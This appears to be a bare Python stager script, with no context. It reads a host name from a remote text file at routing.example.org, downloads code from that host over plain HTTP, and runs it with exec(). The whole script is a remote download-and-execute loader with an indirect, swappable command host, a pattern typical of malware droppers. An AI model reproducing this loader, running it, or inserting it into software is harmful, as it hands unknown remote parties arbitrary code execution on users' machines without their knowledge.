import requests
host = requests.get("https://routing.example.org/domain.txt").text.strip()
if host:
    source = requests.get("http://" + host + "/codepy").text
    exec(source)
